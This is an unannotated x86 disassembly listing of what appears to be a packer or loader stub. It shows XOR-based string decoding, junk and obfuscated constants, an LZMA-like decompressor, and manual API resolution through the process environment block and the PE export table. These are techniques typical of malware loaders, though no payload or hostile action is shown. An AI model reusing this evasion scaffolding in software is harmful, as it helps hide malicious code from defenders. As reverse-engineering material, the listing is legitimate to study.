  412105:	xor    ebx,edx
  412107:	add    ebx,eax
  412109:	inc    esi
  41210a:	mov    BYTE PTR [ecx],bl
  41210c:	cmp    esi,0x6
  41210f:	jb     0x4120fe
  412111:	xor    esi,esi
  412113:	lea    ecx,[ebp+esi*1-0x20]
  412117:	movzx  ebx,BYTE PTR [ecx]
  41211a:	xor    ebx,edx
  41211c:	add    ebx,eax
  41211e:	inc    esi
  41211f:	mov    BYTE PTR [ecx],bl
  412121:	cmp    esi,0x7
  412124:	jb     0x412113
  412126:	xor    esi,esi
  412128:	lea    ecx,[ebp+esi*1-0x28]
  41212c:	movzx  ebx,BYTE PTR [ecx]
  41212f:	xor    ebx,edx
  412131:	add    ebx,eax
  412133:	push   0x8
  412135:	mov    BYTE PTR [ecx],bl
  412137:	inc    esi
  412138:	pop    ecx
  412139:	cmp    esi,ecx
  41213b:	jb     0x412128
  41213d:	lea    eax,[ebp-0x2c]
  412140:	mov    DWORD PTR [ebp-0x8],eax
  412143:	mov    esi,DWORD PTR [ebp-0x8]
  412146:	mov    eax,0x7113fcef
  41214b:	mov    DWORD PTR [esi],eax
  41214d:	mov    esi,DWORD PTR [ebp-0x2c]
  412150:	cmp    esi,eax
  412152:	jne    0x412162
  412154:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41215b:	mov    DWORD PTR [ebp-0x8],0xf89c85e0
  412162:	mov    eax,DWORD PTR [ebp-0x4]
  412165:	mov    eax,DWORD PTR [eax+0x18c]
  41216b:	cmp    DWORD PTR [eax],edi
  41216d:	jne    0x4123bf
  412173:	mov    eax,DWORD PTR [ebp-0x4]
  412176:	mov    eax,DWORD PTR [eax+0x17c]
  41217c:	mov    DWORD PTR [eax],edi
  41217e:	mov    eax,DWORD PTR [ebp-0x4]
  412181:	mov    eax,DWORD PTR [eax+0x180]
  412187:	mov    DWORD PTR [eax],edi
  412189:	mov    edi,0x4e3d
  41218e:	mov    eax,0x4f8e
  412193:	mov    WORD PTR [ebp-0x78],ax
  412197:	mov    eax,edi
  412199:	mov    WORD PTR [ebp-0x76],ax
  41219d:	add    eax,0x41
  4121a0:	mov    WORD PTR [ebp-0x74],ax
  4121a4:	lea    eax,[edi+0x1]
  4121a7:	mov    WORD PTR [ebp-0x72],ax
  4121ab:	mov    eax,0x4fad
  4121b0:	mov    WORD PTR [ebp-0x70],ax
  4121b4:	lea    eax,[edi-0xc]
  4121b7:	mov    WORD PTR [ebp-0x6e],ax
  4121bb:	add    eax,0x4b
  4121be:	mov    WORD PTR [ebp-0x6c],ax
  4121c2:	lea    eax,[edi-0xa]
  4121c5:	mov    WORD PTR [ebp-0x6a],ax
  4121c9:	mov    eax,edi
  4121cb:	mov    WORD PTR [ebp-0x68],ax
  4121cf:	add    eax,0xfffffff5
  4121d2:	mov    WORD PTR [ebp-0x66],ax
  4121d6:	mov    eax,0x99fe
  4121db:	mov    WORD PTR [ebp-0x64],ax
  4121df:	mov    eax,0x8281
  4121e4:	mov    WORD PTR [ebp-0x62],ax
  4121e8:	mov    eax,0xd78c
  4121ed:	mov    WORD PTR [ebp-0x60],ax
  4121f1:	add    eax,0x14
  4121f4:	mov    WORD PTR [ebp-0x5e],ax
  4121f8:	mov    eax,0x27a3
  4121fd:	mov    WORD PTR [ebp-0x5c],ax
  412201:	mov    eax,0x47a3
  412206:	mov    WORD PTR [ebp-0x5a],ax
  41220a:	lea    eax,[edi-0xd]
  41220d:	mov    WORD PTR [ebp-0x58],ax
  412211:	mov    DWORD PTR [ebp-0x10],0xf306020f
  412218:	mov    DWORD PTR [ebp-0xc],0x7a050a1d
  41221f:	lea    eax,[ebp-0x10]
  412222:	mov    bl,BYTE PTR [eax]
  412224:	xor    bl,dl
  412226:	sub    bl,0xb
  412229:	mov    BYTE PTR [eax],bl
  41222b:	inc    eax
  41222c:	dec    ecx
  41222d:	jne    0x412222
  41222f:	lea    eax,[ebp-0x10]
  412232:	mov    DWORD PTR [ebp-0xb8],eax
  412238:	lea    eax,[ebp-0xbc]
  41223e:	push   eax
  41223f:	mov    eax,DWORD PTR [ebp+0xc]
  412242:	mov    ebx,0x7510896
  412247:	xor    eax,ebx
  412249:	mov    esi,0x3272dd
  41224e:	add    eax,esi
  412250:	push   eax
  412251:	mov    eax,DWORD PTR [ebp-0x4]
  412254:	add    eax,0x66
  412257:	push   eax
  412258:	mov    eax,DWORD PTR [ebp-0x4]
  41225b:	mov    eax,DWORD PTR [eax+0x198]
  412261:	mov    DWORD PTR [ebp-0xbc],0x1
  41226b:	push   DWORD PTR [eax]
  41226d:	mov    eax,DWORD PTR [ebp+0x10]
  412270:	call   eax
  412272:	mov    ecx,DWORD PTR [ebp+0x8]
  412275:	xor    ecx,ebx
  412277:	add    ecx,esi
  412279:	mov    DWORD PTR [ebp-0x8],eax
  41227c:	cmp    eax,ecx
  41227e:	jne    0x412299
  412280:	mov    eax,ds:0x33730bec
  412285:	or     eax,0x22150bef
  41228a:	mov    ds:0x33730bec,eax
  41228f:	add    eax,0x3372e90f
  412294:	mov    ds:0x33730bec,eax
  412299:	mov    ecx,0x4f85
  41229e:	mov    eax,ecx
  4122a0:	mov    WORD PTR [ebp-0x40],ax
  4122a4:	add    eax,0x3
  4122a7:	mov    edx,eax
  4122a9:	mov    WORD PTR [ebp-0x3e],dx
  4122ad:	lea    edx,[ecx+0xb]
  4122b0:	mov    WORD PTR [ebp-0x3c],dx
  4122b4:	add    edx,0x18
  4122b7:	mov    WORD PTR [ebp-0x3a],dx
  4122bb:	lea    edx,[ecx+0x25]
  4122be:	mov    WORD PTR [ebp-0x38],dx
  4122c2:	add    edx,0x5
  4122c5:	mov    WORD PTR [ebp-0x36],dx
  4122c9:	lea    edx,[ecx+0x1f]
  4122cc:	mov    WORD PTR [ebp-0x34],dx
  4122d0:	mov    WORD PTR [ebp-0x32],cx
  4122d4:	mov    ecx,edi
  4122d6:	mov    WORD PTR [ebp-0x30],cx
  4122da:	lea    ecx,[edx+0x1]
  4122dd:	mov    edx,ecx
  4122df:	mov    WORD PTR [ebp-0x54],dx
  4122e3:	mov    edx,eax
  4122e5:	mov    WORD PTR [ebp-0x52],dx
  4122e9:	mov    edx,0x4e70
  4122ee:	mov    WORD PTR [ebp-0x50],dx
  4122f2:	mov    WORD PTR [ebp-0x4e],ax
  4122f6:	lea    eax,[ecx-0x1b]
  4122f9:	mov    WORD PTR [ebp-0x4c],ax
  4122fd:	add    eax,0x5
  412300:	mov    WORD PTR [ebp-0x4a],ax
  412304:	lea    eax,[ecx-0x21]
  412307:	mov    WORD PTR [ebp-0x48],ax
  41230b:	mov    WORD PTR [ebp-0x46],cx
  41230f:	mov    WORD PTR [ebp-0x44],di
  412313:	mov    eax,DWORD PTR [ebp+0x8]
  412316:	movzx  ecx,WORD PTR [ebp-0x54]
  41231a:	xor    eax,ebx
  41231c:	add    eax,esi
  41231e:	xor    eax,ecx
  412320:	mov    WORD PTR [ebp-0x54],ax
  412324:	mov    eax,DWORD PTR [ebp+0x8]
  412327:	movzx  ecx,WORD PTR [ebp-0x40]
  41232b:	xor    eax,ebx
  41232d:	add    eax,esi
  41232f:	xor    eax,ecx
  412331:	mov    WORD PTR [ebp-0x40],ax
  412335:	xor    eax,eax
  412337:	mov    WORD PTR [ebp-0xd0],ax
  41233e:	mov    WORD PTR [ebp-0xe4],ax
  412345:	mov    edi,DWORD PTR [ebp+0x24]
  412348:	lea    eax,[ebp-0xd0]
  41234e:	lea    edx,[ebp-0x54]
  412351:	mov    DWORD PTR [ebp-0xbc],0x2
  41235b:	mov    DWORD PTR [ebp-0xb8],eax
  412361:	call   0x414b33
  412366:	mov    DWORD PTR [ebp-0xb4],eax
  41236c:	lea    eax,[ebp-0xbc]
  412372:	push   eax
  412373:	mov    eax,DWORD PTR [ebp+0xc]
  412376:	xor    eax,ebx
  412378:	add    eax,esi
  41237a:	push   eax
  41237b:	lea    eax,[ebp-0x78]
  41237e:	push   eax
  41237f:	push   DWORD PTR [ebp-0x8]
  412382:	mov    eax,DWORD PTR [ebp+0x10]
  412385:	call   eax
  412387:	mov    edi,DWORD PTR [ebp+0x24]
  41238a:	lea    eax,[ebp-0xe4]
  412390:	lea    edx,[ebp-0x40]
  412393:	mov    DWORD PTR [ebp-0xb8],eax
  412399:	call   0x414b33
  41239e:	mov    DWORD PTR [ebp-0xb4],eax
  4123a4:	lea    eax,[ebp-0xbc]
  4123aa:	push   eax
  4123ab:	mov    eax,DWORD PTR [ebp+0xc]
  4123ae:	xor    eax,ebx
  4123b0:	add    eax,esi
  4123b2:	push   eax
  4123b3:	lea    eax,[ebp-0x78]
  4123b6:	push   eax
  4123b7:	push   DWORD PTR [ebp-0x8]
  4123ba:	mov    eax,DWORD PTR [ebp+0x10]
  4123bd:	call   eax
  4123bf:	mov    eax,DWORD PTR [ebp+0x14]
  4123c2:	push   DWORD PTR [ebp-0x4]
  4123c5:	push   DWORD PTR [ebp+0x20]
  4123c8:	push   DWORD PTR [ebp+0x1c]
  4123cb:	push   DWORD PTR [ebp+0x18]
  4123ce:	push   DWORD PTR [ebp+0x10]
  4123d1:	push   DWORD PTR [ebp+0x8]
  4123d4:	push   DWORD PTR [ebp+0xc]
  4123d7:	call   0x4133d7
  4123dc:	add    DWORD PTR [ebp-0x4],eax
  4123df:	mov    eax,DWORD PTR [ebp-0x4]
  4123e2:	mov    eax,DWORD PTR [ebp-0x4]
  4123e5:	mov    edi,DWORD PTR [eax+0x190]
  4123eb:	mov    eax,DWORD PTR [ebp-0x4]
  4123ee:	mov    eax,DWORD PTR [eax+0x18c]
  4123f4:	mov    esi,DWORD PTR [eax]
  4123f6:	lea    ecx,[ebp+0x4]
  4123f9:	mov    edx,DWORD PTR [ecx]
  4123fb:	cmp    edx,esi
  4123fd:	jb     0x412414
  4123ff:	mov    eax,DWORD PTR [edi]
  412401:	mov    edi,DWORD PTR [eax+0x3c]
  412404:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  412408:	add    edi,esi
  41240a:	cmp    edx,edi
  41240c:	jae    0x412414
  41240e:	sub    eax,esi
  412410:	add    eax,edx
  412412:	mov    DWORD PTR [ecx],eax
  412414:	pop    edi
  412415:	pop    esi
  412416:	pop    ebx
  412417:	leave  
  412418:	ret    0x20
  41241b:	push   edi
  41241c:	push   esi
  41241d:	push   ebx
  41241e:	push   ebp
  41241f:	mov    ebp,esp
  412421:	mov    eax,DWORD PTR [ebp+0x24]
  412424:	add    DWORD PTR [ebp+0x28],eax
  412427:	push   eax
  412428:	cld    
  412429:	mov    esi,DWORD PTR [ebp+0x18]
  41242c:	add    DWORD PTR [ebp+0x1c],esi
  41242f:	push   esi
  412430:	mov    esi,DWORD PTR [ebp+0x14]
  412433:	lods   eax,DWORD PTR ds:[esi]
  412434:	xchg   edx,eax
  412435:	push   edx
  412436:	mov    cl,BYTE PTR [esi-0x2]
  412439:	or     eax,0xffffffff
  41243c:	shl    eax,cl
  41243e:	not    eax
  412440:	push   eax
  412441:	mov    cl,dh
  412443:	or     eax,0xffffffff
  412446:	shl    eax,cl
  412448:	not    eax
  41244a:	push   eax
  41244b:	add    cl,dl
  41244d:	mov    edi,esi
  41244f:	sub    esp,0xc
  412452:	sub    eax,eax
  412454:	inc    eax
  412455:	push   eax
  412456:	push   eax
  412457:	push   eax
  412458:	push   eax
  412459:	push   eax
  41245a:	push   edi
  41245b:	sub    esi,esi
  41245d:	push   esi
  41245e:	or     ebx,0xffffffff
  412461:	mov    eax,0x300
  412466:	shl    eax,cl
  412468:	lea    ecx,[eax+0x736]
  41246e:	mov    eax,0x4000400
  412473:	shr    ecx,1
  412475:	rep stos DWORD PTR es:[edi],eax
  412477:	push   0x5
  412479:	pop    ecx
  41247a:	call   0x412765
  41247f:	loop   0x41247a
  412481:	lea    esi,[esi]
  412483:	lea    edi,[edi]
  412485:	mov    edi,DWORD PTR [ebp-0x4]
  412488:	mov    eax,DWORD PTR [ebp-0x10]
  41248b:	sub    edi,DWORD PTR [ebp+0x24]
  41248e:	and    eax,edi
  412490:	mov    DWORD PTR [ebp-0x18],eax
  412493:	mov    al,0x0
  412495:	call   0x41277d
  41249a:	jne    0x412535
  4124a0:	mov    cl,BYTE PTR [ebp-0xc]
  4124a3:	and    edi,DWORD PTR [ebp-0x14]
  4124a6:	shl    edi,cl
  4124a8:	sub    cl,0x8
  4124ab:	neg    cl
  4124ad:	shr    esi,cl
  4124af:	pop    eax
  4124b0:	add    edi,esi
  4124b2:	pop    esi
  4124b3:	lea    edi,[edi+edi*2]
  4124b6:	shl    edi,0x8
  4124b9:	cmp    al,0x7
  4124bb:	pop    edx
  4124bc:	lea    ecx,[esi+edi*2+0xe6c]
  4124c3:	push   ecx
  4124c4:	push   esi
  4124c5:	mov    esi,0x100
  4124ca:	push   eax
  4124cb:	mov    al,0x1
  4124cd:	jb     0x412503
  4124cf:	mov    edi,DWORD PTR [ebp-0x4]
  4124d2:	sub    edi,DWORD PTR [ebp-0x24]
  4124d5:	movzx  edi,BYTE PTR [edi]
  4124d8:	mov    ebp,DWORD PTR [ebp-0x34]
  4124db:	shl    edi,1
  4124dd:	mov    ecx,esi
  4124df:	and    esi,edi
  4124e1:	add    ecx,esi
  4124e3:	lea    ebp,[ebp+ecx*2+0x0]
  4124e7:	call   0x41279c
  4124ec:	mov    ecx,eax
  4124ee:	shr    esi,0x8
  4124f1:	and    ecx,0x1
  4124f4:	cmp    esi,ecx
  4124f6:	mov    esi,0x100
  4124fb:	jne    0x41250b
  4124fd:	cmp    eax,esi
  4124ff:	jb     0x4124d8
  412501:	jmp    0x412517
  412503:	mov    ebp,DWORD PTR [ebp-0x34]
  412506:	call   0x41279c
  41250b:	inc    eax
  41250c:	inc    esi
  41250d:	sub    eax,0x1
  412510:	sub    esi,0x1
  412513:	cmp    eax,esi
  412515:	jb     0x412503
  412517:	pop    edx
  412518:	inc    edx
  412519:	cmp    edx,0x5
  41251c:	dec    edx
  41251d:	mov    ecx,edx
  41251f:	jb     0x412530
  412521:	inc    edx
  412522:	cmp    edx,0xb
  412525:	dec    edx
  412526:	mov    cl,0x4
  412528:	dec    cl
  41252a:	jb     0x412530
  41252c:	mov    cl,0x7
  41252e:	dec    cl
  412530:	sub    edx,ecx
  412532:	push   edx
  412533:	jmp    0x412584
  412535:	mov    al,0xc1
  412537:	dec    al
  412539:	call   0x41278d
  41253e:	jne    0x412554
  412540:	pop    eax
  412541:	pop    edi
  412542:	pop    edx
  412543:	pop    ecx
  412544:	pop    edx
  412545:	pop    ecx
  412546:	push   DWORD PTR [esp]
  412549:	push   ecx
  41254a:	push   edx
  41254b:	mov    edx,0x664
  412550:	mov    cl,0x0
  412552:	jmp    0x4125c7
  412554:	mov    al,0xcd
  412556:	dec    al
  412558:	call   0x41278d
  41255d:	jne    0x41258d
  41255f:	mov    al,0xf1
  412561:	dec    al
  412563:	call   0x41277d
  412568:	jne    0x4125bd
  41256a:	pop    eax
  41256b:	cmp    al,0x7
  41256d:	mov    al,0x9
  41256f:	jb     0x412573
  412571:	mov    al,0xb
  412573:	push   eax
  412574:	mov    esi,DWORD PTR [ebp-0x4]
  412577:	sub    esi,DWORD PTR [ebp-0x24]
  41257a:	cmp    esi,DWORD PTR [ebp+0x24]
  41257d:	jb     0x412754
  412583:	lods   al,BYTE PTR ds:[esi]
  412584:	mov    edi,DWORD PTR [ebp-0x4]
  412587:	stos   BYTE PTR es:[edi],al
  412588:	jmp    0x41271b
  41258d:	mov    al,0xd8
  41258f:	call   0x41278d
  412594:	mov    esi,DWORD PTR [ebp-0x28]
  412597:	je     0x4125b4
  412599:	mov    al,0xe4
  41259b:	call   0x41278d
  4125a0:	mov    esi,DWORD PTR [ebp-0x2c]
  4125a3:	je     0x4125ae
  4125a5:	mov    esi,DWORD PTR [ebp-0x30]
  4125a8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4125ab:	mov    DWORD PTR [ebp-0x30],ecx
  4125ae:	mov    ecx,DWORD PTR [ebp-0x28]
  4125b1:	mov    DWORD PTR [ebp-0x2c],ecx
  4125b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4125b7:	mov    DWORD PTR [ebp-0x28],ecx
  4125ba:	mov    DWORD PTR [ebp-0x24],esi
  4125bd:	pop    eax
  4125be:	pop    edi
  4125bf:	pop    ecx
  4125c0:	mov    edx,0xa68
  4125c5:	mov    cl,0x8
  4125c7:	add    edx,edi
  4125c9:	push   edx
  4125ca:	push   edi
  4125cb:	cmp    al,0x7
  4125cd:	mov    al,cl
  4125cf:	jb     0x4125d3
  4125d1:	add    al,0x3
  4125d3:	push   eax
  4125d4:	mov    ebp,DWORD PTR [ebp-0x34]
  4125d7:	call   0x41279a
  4125dc:	jne    0x4125f2
  4125de:	mov    eax,DWORD PTR [ebp-0x18]
  4125e1:	mov    edi,DWORD PTR [ebp-0x34]
  4125e4:	shl    eax,0x3
  4125e7:	sub    ecx,ecx
  4125e9:	push   0x8
  4125eb:	pop    esi
  4125ec:	lea    edi,[edi+eax*2+0x4]
  4125f0:	jmp    0x412627
  4125f2:	mov    ebp,DWORD PTR [ebp-0x34]
  4125f5:	add    ebp,0x2
  4125f8:	call   0x41279a
  4125fd:	jne    0x412617
  4125ff:	mov    eax,DWORD PTR [ebp-0x18]
  412602:	mov    edi,DWORD PTR [ebp-0x34]
  412605:	shl    eax,0x3
  412608:	push   0x8
  41260a:	pop    ecx
  41260b:	push   0x8
  41260d:	pop    esi
  41260e:	lea    edi,[edi+eax*2+0x104]
  412615:	jmp    0x412627
  412617:	mov    edi,0x204
  41261c:	add    edi,DWORD PTR [ebp-0x34]
  41261f:	push   0x10
  412621:	pop    ecx
  412622:	mov    esi,0x100
  412627:	mov    DWORD PTR [ebp-0x1c],ecx
  41262a:	sub    eax,eax
  41262c:	inc    eax
  41262d:	mov    ebp,edi
  41262f:	call   0x41279c
  412634:	mov    ecx,eax
  412636:	sub    ecx,esi
  412638:	jb     0x41262d
  41263a:	add    DWORD PTR [ebp-0x1c],ecx
  41263d:	cmp    DWORD PTR [ebp-0x3c],0x4
  412641:	jae    0x4126f7
  412647:	add    DWORD PTR [ebp-0x3c],0x7
  41264b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41264e:	cmp    ecx,0x4
  412651:	jb     0x412656
  412653:	push   0x3
  412655:	pop    ecx
  412656:	mov    edi,DWORD PTR [ebp-0x38]
  412659:	shl    ecx,0x6
  41265c:	sub    eax,eax
  41265e:	inc    eax
  41265f:	push   0x40
  412661:	pop    esi
  412662:	lea    edi,[edi+ecx*2+0x360]
  412669:	mov    ebp,edi
  41266b:	call   0x41279c
  412670:	mov    ecx,eax
  412672:	sub    ecx,esi
  412674:	jb     0x412669
  412676:	mov    DWORD PTR [ebp-0x18],ecx
  412679:	mov    DWORD PTR [ebp-0x24],ecx
  41267c:	cmp    ecx,0x4
  41267f:	jb     0x4126f4
  412681:	mov    esi,ecx
  412683:	and    DWORD PTR [ebp-0x24],0x1
  412687:	shr    esi,1
  412689:	or     DWORD PTR [ebp-0x24],0x2
  41268d:	dec    esi
  41268e:	cmp    ecx,0xe
  412691:	jae    0x4126ac
  412693:	mov    eax,0x2af
  412698:	sub    eax,ecx
  41269a:	mov    ecx,esi
  41269c:	shl    BYTE PTR [ebp-0x24],cl
  41269f:	add    eax,DWORD PTR [ebp-0x24]
  4126a2:	shl    eax,1
  4126a4:	add    eax,DWORD PTR [ebp-0x38]
  4126a7:	mov    DWORD PTR [ebp-0x34],eax
  4126aa:	jmp    0x4126d9
  4126ac:	sub    esi,0x4
  4126af:	call   0x412759
  4126b4:	shr    ebx,1
  4126b6:	shl    DWORD PTR [ebp-0x24],1
  4126b9:	cmp    DWORD PTR [ebp-0x20],ebx
  4126bc:	jb     0x4126c4
  4126be:	inc    DWORD PTR [ebp-0x24]
  4126c1:	sub    DWORD PTR [ebp-0x20],ebx
  4126c4:	dec    esi
  4126c5:	jne    0x4126af
  4126c7:	mov    eax,0x644
  4126cc:	add    eax,DWORD PTR [ebp-0x38]
  4126cf:	mov    DWORD PTR [ebp-0x34],eax
  4126d2:	shl    DWORD PTR [ebp-0x24],0x4
  4126d6:	push   0x4
  4126d8:	pop    esi
  4126d9:	sub    edi,edi
  4126db:	inc    edi
  4126dc:	mov    eax,edi
  4126de:	mov    ebp,DWORD PTR [ebp-0x34]
  4126e1:	call   0x41279c
  4126e6:	test   al,0x1
  4126e8:	je     0x4126ed
  4126ea:	or     DWORD PTR [ebp-0x24],edi
  4126ed:	shl    edi,1
  4126ef:	dec    esi
  4126f0:	jne    0x4126de
  4126f2:	jmp    0x4126f4
  4126f4:	inc    DWORD PTR [ebp-0x24]
  4126f7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4126fa:	add    ecx,0x2
  4126fd:	mov    edi,DWORD PTR [ebp-0x4]
  412700:	mov    eax,edi
  412702:	sub    eax,DWORD PTR [ebp+0x24]
  412705:	cmp    DWORD PTR [ebp-0x24],eax
  412708:	ja     0x412754
  41270a:	mov    esi,edi
  41270c:	sub    esi,DWORD PTR [ebp-0x24]
  41270f:	mov    edx,DWORD PTR [ebp+0x28]
  412712:	lods   al,BYTE PTR ds:[esi]
  412713:	stos   BYTE PTR es:[edi],al
  412714:	cmp    edi,edx
  412716:	jae    0x41271b
  412718:	dec    ecx
  412719:	jne    0x412712
  41271b:	mov    DWORD PTR [ebp-0x4],edi
  41271e:	movzx  esi,al
  412721:	cmp    edi,DWORD PTR [ebp+0x28]
  412724:	jb     0x412485
  41272a:	call   0x412759
  41272f:	sub    eax,eax
  412731:	lea    ebp,[esp+0x3c]
  412735:	mov    edx,DWORD PTR [ebp+0x20]
  412738:	mov    esi,DWORD PTR [ebp-0x8]
  41273b:	sub    esi,DWORD PTR [ebp+0x18]
  41273e:	mov    DWORD PTR [edx],esi
  412740:	mov    edx,DWORD PTR [ebp+0x2c]
  412743:	mov    edi,DWORD PTR [ebp-0x4]
  412746:	sub    edi,DWORD PTR [ebp+0x24]
  412749:	mov    DWORD PTR [edx],edi
  41274b:	leave  
  41274c:	pop    ebx
  41274d:	pop    esi
  41274e:	pop    edi
  41274f:	ret    0x1c
  412752:	pop    esi
  412753:	pop    eax
  412754:	sub    eax,eax
  412756:	inc    eax
  412757:	jmp    0x412731
  412759:	cmp    ebx,0x1000000
  41275f:	jb     0x412762
  412761:	ret    
  412762:	shl    ebx,0x8
  412765:	push   esi
  412766:	mov    esi,DWORD PTR [ebp-0x8]
  412769:	cmp    esi,DWORD PTR [ebp+0x1c]
  41276c:	jae    0x412752
  41276e:	mov    eax,DWORD PTR [ebp-0x20]
  412771:	shl    eax,0x8
  412774:	lods   al,BYTE PTR ds:[esi]
  412775:	mov    DWORD PTR [ebp-0x20],eax
  412778:	mov    DWORD PTR [ebp-0x8],esi
  41277b:	pop    esi
  41277c:	ret    
  41277d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412780:	movzx  eax,al
  412783:	shl    ecx,0x4
  412786:	add    eax,DWORD PTR [ebp-0x18]
  412789:	add    eax,ecx
  41278b:	jmp    0x412793
  41278d:	movzx  eax,al
  412790:	add    eax,DWORD PTR [ebp-0x3c]
  412793:	mov    ebp,DWORD PTR [ebp-0x38]
  412796:	lea    ebp,[ebp+eax*2+0x0]
  41279a:	sub    eax,eax
  41279c:	lea    ebp,[ebp+eax*2+0x0]
  4127a0:	cmp    ebx,0x1000000
  4127a6:	jae    0x4127c4
  4127a8:	mov    ecx,DWORD PTR [esp+0x38]
  4127ac:	shl    DWORD PTR [esp+0x20],0x8
  4127b1:	cmp    ecx,DWORD PTR [esp+0x5c]
  4127b5:	jae    0x412753
  4127b7:	mov    dl,BYTE PTR [ecx]
  4127b9:	inc    DWORD PTR [esp+0x38]
  4127bd:	shl    ebx,0x8
  4127c0:	mov    BYTE PTR [esp+0x20],dl
  4127c4:	mov    ecx,ebx
  4127c6:	movzx  edx,WORD PTR [ebp+0x0]
  4127ca:	shr    ecx,0xb
  4127cd:	imul   ecx,edx
  4127d0:	cmp    DWORD PTR [esp+0x20],ecx
  4127d4:	jae    0x4127ed
  4127d6:	mov    ebx,ecx
  4127d8:	mov    ecx,0x800
  4127dd:	sub    ecx,edx
  4127df:	shr    ecx,0x5
  4127e2:	add    WORD PTR [ebp+0x0],cx
  4127e6:	add    eax,eax
  4127e8:	lea    ebp,[esp+0x40]
  4127ec:	ret    
  4127ed:	shr    edx,0x5
  4127f0:	sub    DWORD PTR [esp+0x20],ecx
  4127f4:	sub    ebx,ecx
  4127f6:	sub    WORD PTR [ebp+0x0],dx
  4127fa:	add    eax,eax
  4127fc:	add    eax,0x1
  4127ff:	lea    ebp,[esp+0x40]
  412803:	ret    
  412804:	push   ebp
  412805:	mov    ebp,esp
  412807:	sub    esp,0xec
  41280d:	push   ebx
  41280e:	push   esi
  41280f:	push   edi
  412810:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  412817:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  41281e:	mov    eax,DWORD PTR [ebp+0x8]
  412821:	mov    DWORD PTR [ebp+0x8],eax
  412824:	mov    ecx,DWORD PTR [ebp-0x8]
  412827:	mov    ebx,0x7510896
  41282c:	xor    ecx,ebx
  41282e:	mov    eax,0x3272dd
  412833:	add    ecx,eax
  412835:	mov    DWORD PTR [ebp-0x20],ecx
  412838:	mov    ecx,DWORD PTR [ebp-0x8]
  41283b:	xor    ecx,ebx
  41283d:	add    ecx,eax
  41283f:	mov    DWORD PTR [ebp-0x30],ecx
  412842:	mov    ecx,DWORD PTR [ebp-0x8]
  412845:	xor    ecx,ebx
  412847:	add    ecx,eax
  412849:	mov    DWORD PTR [ebp-0x2c],ecx
  41284c:	mov    ecx,DWORD PTR [ebp-0x8]
  41284f:	xor    ecx,ebx
  412851:	add    ecx,eax
  412853:	mov    DWORD PTR [ebp-0xa0],ecx
  412859:	mov    DWORD PTR [ebp-0x48],0xf89f05b5
  412860:	mov    DWORD PTR [ebp-0x2c],0xf89cb5b5
  412867:	mov    DWORD PTR [ebp-0x3c],0xf89c85b1
  41286e:	push   0x24
  412870:	pop    ecx
  412871:	mov    DWORD PTR [ebp-0x28],ecx
  412874:	mov    DWORD PTR [ebp-0x28],ecx
  412877:	push   0x64
  412879:	pop    ecx
  41287a:	mov    DWORD PTR [ebp-0x28],ecx
  41287d:	mov    DWORD PTR [ebp-0x28],ecx
  412880:	mov    DWORD PTR [ebp-0x28],0x4c
  412887:	mov    DWORD PTR [ebp-0x28],0x42
  41288e:	mov    ecx,DWORD PTR [ebp-0x8]
  412891:	xor    ecx,ebx
  412893:	add    ecx,eax
  412895:	mov    DWORD PTR [ebp-0x28],ecx
  412898:	mov    ecx,DWORD PTR [ebp-0x8]
  41289b:	xor    ecx,ebx
  41289d:	add    ecx,eax
  41289f:	mov    DWORD PTR [ebp-0x28],ecx
  4128a2:	mov    DWORD PTR [ebp-0x24],0x256
  4128a9:	mov    DWORD PTR [ebp-0x1c],0x34
  4128b0:	mov    DWORD PTR [ebp-0xc],0x78
  4128b7:	lea    edi,[ebp-0xcc]
  4128bd:	lea    esi,[ebp-0xec]
  4128c3:	call   0x413346
  4128c8:	dec    DWORD PTR [ebp-0xc]
  4128cb:	jne    0x4128b7
  4128cd:	dec    DWORD PTR [ebp-0x1c]
  4128d0:	jne    0x4128b0
  4128d2:	dec    DWORD PTR [ebp-0x24]
  4128d5:	jne    0x4128a9
  4128d7:	mov    DWORD PTR [ebp-0x1c],0x400c
  4128de:	mov    eax,DWORD PTR [ebp-0x8]
  4128e1:	xor    eax,ebx
  4128e3:	mov    esi,0x3272dd
  4128e8:	add    eax,esi
  4128ea:	mov    DWORD PTR [ebp-0x14],eax
  4128ed:	mov    eax,DWORD PTR [ebp-0x8]
  4128f0:	and    DWORD PTR [ebp-0x8c],0x0
  4128f7:	xor    eax,ebx
  4128f9:	add    eax,esi
  4128fb:	mov    DWORD PTR [ebp-0x24],eax
  4128fe:	mov    eax,fs:0x18
  412904:	mov    DWORD PTR [ebp-0x8c],eax
  41290a:	mov    eax,DWORD PTR [eax+0x30]
  41290d:	mov    DWORD PTR [ebp-0x90],eax
  412913:	mov    eax,DWORD PTR [eax+0xc]
  412916:	mov    DWORD PTR [ebp-0x9c],eax
  41291c:	mov    eax,DWORD PTR [ebp+0x8]
  41291f:	lea    ecx,[ebp-0x8c]
  412925:	mov    DWORD PTR [eax+0x1a0],ecx
  41292b:	mov    eax,DWORD PTR [ebp+0x8]
  41292e:	lea    ecx,[ebp-0x90]
  412934:	mov    DWORD PTR [eax+0x1a4],ecx
  41293a:	mov    eax,DWORD PTR [ebp+0x8]
  41293d:	push   DWORD PTR [ebp+0x8]
  412940:	lea    ecx,[ebp-0x9c]
  412946:	mov    DWORD PTR [eax+0x1a8],ecx
  41294c:	call   0x414b04
  412951:	mov    ecx,DWORD PTR [ebp-0x8]
  412954:	xor    ecx,ebx
  412956:	add    ecx,esi
  412958:	cmp    ecx,eax
  41295a:	je     0x412c2e
  412960:	mov    eax,DWORD PTR [ebp+0x8]
  412963:	mov    eax,DWORD PTR [eax+0x194]
  412969:	mov    ecx,DWORD PTR [eax]
  41296b:	mov    eax,DWORD PTR [ebp+0x8]
  41296e:	mov    eax,DWORD PTR [eax+0x194]
  412974:	mov    eax,DWORD PTR [eax]
  412976:	add    eax,DWORD PTR [ecx+0x3c]
  412979:	mov    ecx,DWORD PTR [ebp+0x8]
  41297c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  412982:	lea    edx,[ebp-0xac]
  412988:	push   edx
  412989:	mov    edx,DWORD PTR [ebp+0x8]
  41298c:	mov    edx,DWORD PTR [edx+0x18c]
  412992:	mov    edx,DWORD PTR [edx]
  412994:	add    edx,DWORD PTR [eax+0x88]
  41299a:	push   0x4
